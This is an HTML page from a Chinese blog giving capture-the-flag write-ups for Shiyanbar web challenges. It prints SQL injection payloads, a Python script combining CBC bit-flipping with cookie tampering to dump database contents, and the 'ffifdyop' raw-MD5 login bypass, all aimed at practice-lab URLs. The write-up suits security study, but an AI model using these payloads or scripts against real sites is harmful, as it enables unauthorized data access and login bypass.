@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>实验吧Web | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧Web">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/65109/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/13.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/36.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/37.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/38.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/39.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/14.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/15.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/16.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/17.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/18.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/19.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/20.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/21.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/22.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/23.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/24.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/25.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/26.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/27.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/28.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/29.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/30.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/31.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/32.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/33.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/34.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/实验吧Web/35.png">
+<meta property="og:updated_time" content="2018-09-17T12:35:12.755Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧Web">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/实验吧Web/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">实验吧Web</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的登录题"><span class="post-toc-number">1.</span> <span class="post-toc-text">简单的登录题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#后台登录"><span class="post-toc-number">2.</span> <span class="post-toc-text">后台登录</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#加了料的报错注入"><span class="post-toc-number">3.</span> <span class="post-toc-text">加了料的报错注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#认真一点"><span class="post-toc-number">4.</span> <span class="post-toc-text">认真一点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#你真的会PHP吗"><span class="post-toc-number">5.</span> <span class="post-toc-text">你真的会PHP吗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#登陆一下好吗"><span class="post-toc-number">6.</span> <span class="post-toc-text">登陆一下好吗??</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#who-are-you"><span class="post-toc-number">7.</span> <span class="post-toc-text">who are you?</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的sql注入"><span class="post-toc-number">8.</span> <span class="post-toc-text">简单的sql注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的sql注入之2"><span class="post-toc-number">9.</span> <span class="post-toc-text">简单的sql注入之2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的sql注入之3"><span class="post-toc-number">10.</span> <span class="post-toc-text">简单的sql注入之3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#因缺思汀的绕过"><span class="post-toc-number">11.</span> <span class="post-toc-text">因缺思汀的绕过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#天下武功唯快不破"><span class="post-toc-number">12.</span> <span class="post-toc-text">天下武功唯快不破</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#拐弯抹角"><span class="post-toc-number">13.</span> <span class="post-toc-text">拐弯抹角</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Forms"><span class="post-toc-number">14.</span> <span class="post-toc-text">Forms</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#天网管理系统"><span class="post-toc-number">15.</span> <span class="post-toc-text">天网管理系统</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#忘记密码了"><span class="post-toc-number">16.</span> <span class="post-toc-text">忘记密码了</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Once-More"><span class="post-toc-number">17.</span> <span class="post-toc-text">Once More</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#FALSE"><span class="post-toc-number">18.</span> <span class="post-toc-text">FALSE</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#上传绕过"><span class="post-toc-number">19.</span> <span class="post-toc-text">上传绕过</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#NSCTF-web200"><span class="post-toc-number">20.</span> <span class="post-toc-text">NSCTF web200</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#程序逻辑问题"><span class="post-toc-number">21.</span> <span class="post-toc-text">程序逻辑问题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#what-a-fuck-这是什么鬼东西"><span class="post-toc-number">22.</span> <span class="post-toc-text">what a fuck!这是什么鬼东西?</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP大法"><span class="post-toc-number">23.</span> <span class="post-toc-text">PHP大法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#这个看起来有点简单"><span class="post-toc-number">24.</span> <span class="post-toc-text">这个看起来有点简单!</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#貌似有点难"><span class="post-toc-number">25.</span> <span class="post-toc-text">貌似有点难</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#头有点大"><span class="post-toc-number">26.</span> <span class="post-toc-text">头有点大</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猫抓老鼠"><span class="post-toc-number">27.</span> <span class="post-toc-text">猫抓老鼠</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#看起来有点难"><span class="post-toc-number">28.</span> <span class="post-toc-text">看起来有点难</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-实验吧Web"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">实验吧Web</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-09-13 14:34:00" datetime="2018-09-13T06:34:00.000Z"  itemprop="datePublished">2018-09-13</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">39</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>实验吧Web题解<a id="more"></a></p>
+<h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/index.php</a></p>
+<p>burp抓包发现响应包头部tips:test.php</p>
+<p>test.php给出了index.php的源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;); </span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">include(&apos;conn.php&apos;); </span><br><span class="line">function sqliCheck($str)&#123; </span><br><span class="line">	if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123; </span><br><span class="line">		return 1; </span><br><span class="line">	&#125; </span><br><span class="line">	return 0; </span><br><span class="line">&#125; </span><br><span class="line">function get_random_iv()&#123; </span><br><span class="line">	$random_iv=&apos;&apos;; </span><br><span class="line">	for($i=0;$i&lt;16;$i++)&#123; </span><br><span class="line">		$random_iv.=chr(rand(1,255)); </span><br><span class="line">	&#125; </span><br><span class="line">	return $random_iv; </span><br><span class="line">&#125; </span><br><span class="line">function login($info)&#123; </span><br><span class="line">	$iv = get_random_iv(); </span><br><span class="line">	$plain = serialize($info); </span><br><span class="line">	$cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); </span><br><span class="line">	setcookie(&quot;iv&quot;, base64_encode($iv)); </span><br><span class="line">	setcookie(&quot;cipher&quot;, base64_encode($cipher)); </span><br><span class="line">&#125; </span><br><span class="line">function show_homepage()&#123; </span><br><span class="line">	global $link; </span><br><span class="line">	if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; </span><br><span class="line">		$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); </span><br><span class="line">		$iv = base64_decode($_COOKIE[&quot;iv&quot;]); </span><br><span class="line">		if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; </span><br><span class="line">			$info = unserialize($plain) or die(&quot;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&quot;); </span><br><span class="line">			$sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; </span><br><span class="line">			$result=mysqli_query($link,$sql); </span><br><span class="line">			if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; </span><br><span class="line">				$rows=mysqli_fetch_array($result); </span><br><span class="line">				echo &apos;Hello!&apos;.$rows[&apos;username&apos;].&apos;&apos;; </span><br><span class="line">			&#125; </span><br><span class="line">			else&#123; </span><br><span class="line">				echo &apos;Hello!&apos;; </span><br><span class="line">			&#125; </span><br><span class="line">		&#125;</span><br><span class="line">		else&#123; </span><br><span class="line">			die(&quot;ERROR!&quot;); </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123; </span><br><span class="line">	$id = (string)$_POST[&apos;id&apos;]; </span><br><span class="line">	if(sqliCheck($id)) </span><br><span class="line">		die(&quot;sql inject detected!&quot;); </span><br><span class="line">	$info = array(&apos;id&apos;=&gt;$id); </span><br><span class="line">	login($info); </span><br><span class="line">	echo &apos;Hello!&apos;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">	if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123; </span><br><span class="line">		show_homepage(); </span><br><span class="line">	&#125;</span><br><span class="line">	else&#123; </span><br><span class="line">		echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计代码，首先对我们post的参数id进行了sql语句关键词过滤，其中过滤了union，逗号，#，=，-，like，然后通过过滤后对数组plain进行cbc加密，加密后的值cipher和随机16位字符串iv存储在cookie对应的字段中，最终将cbc解密的id值执行sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="string">".$info['id']."</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>可见，不管我们给id赋值1,2,3等，最终经过limit id,0后都得不到查询结果。我们要进行sql注入的话，就必须将后面的0注释掉，但是这里过滤掉了注释符#，–，所以用%00代替注释</p>
+<p>给个payload:1;%00，通过burp先post id=1;%00，再将得到的cookie加入请求头的cookie字段，然后再访问，但是这里可能是php或者mysql修复了%00截断，因为直接输入1;%00依然无法实现截断 </p>
+<p>以下这段话参考别人的文章：</p>
+<p>%00截断并不是字面意义上的截断，而是指%00经过urldecode之后会变成空字符\0，我们知道在c语言中\0是字符串的结尾，所以\0之后的字符就被截断了。所以，在本道题中不能直接输入1;%00，因为这样会被编码成1%3B%2500，需要用burpsuit抓包后修改为1%3B%00，然后再post才能成功截断。 </p>
+<p>试着post id=1%3B%00</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功得到用户名信息</p>
+<p>那么我们继续执行注入，必须用到union，但是这里过滤了union，所以我们通过cbc字节翻转的方式，具体cbc字节翻转攻击原理就不具体说了，可以参考我之前的文章。此外，还过滤了逗号，那么我们可以用连接关键词join</p>
+<p>下面直接给出payloads</p>
+<p>注数据库名的payload:0 Anion select * from ((select 1)a join (select database())b join (select 3)c);%00</p>
+<p>注表名的payload:0 Anion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c);%00</p>
+<p>注列名的payload:0 Anion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=’you_want’)b join (select 3)c);%00</p>
+<p>注数据的payload:0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);”%00</p>
+<p>下面给出最后注出flag的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/jiandan/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'id'</span>: <span class="string">"0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1 = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r1.cookies)</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cookies[<span class="string">'cipher'</span>]))</span><br><span class="line">index = <span class="number">7</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'u'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line">iv = base64.b64decode(urllib.unquote(cookies[<span class="string">'iv'</span>]))</span><br><span class="line">target = <span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">new_iv = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	new_iv = new_iv + chr(ord(iv[i])^ord(plain[i])^ord(target[i]))</span><br><span class="line">cookies[<span class="string">'iv'</span>] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=cookies)</span><br><span class="line">r3.encoding = r3.apparent_encoding</span><br><span class="line"><span class="keyword">print</span> r3.text</span><br></pre></td></tr></table></figure>
+<p>说明一下在python中chr(0)代表空字符的意思，而我们要进行截断都是通过空字符来截断</p>
+<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p>
+<p>源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">	echo &apos;flag is :&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &apos;密码错误!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对参数password进行了md5加密，看似不能进行sql注入，但是这里md5函数里出现参数true，查询一下md5参数加入了参数true，得到的是原始16位的二进制数</p>
+<p>在本地测试了一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>二进制数在浏览器上显示时会转化为字符串</p>
+<p>所以我们进行注入的话，就必须要想办法让md5加密后是’or 6的形式</p>
+<p>这里直接拿别人得到的字符串： ffifdyop </p>
+<p><img src="/img/实验吧Web/4.png" alt=""></p>
+<p>可以看到加密后的字符串为’or’6É]™é!r,ùíb</p>
+<p>拼接到sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".'</span> <span class="keyword">or</span> <span class="string">'6É]™é!r,ùíb."'</span></span><br></pre></td></tr></table></figure>
+<p>语句恒真，始终有查询结果，成功注出flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
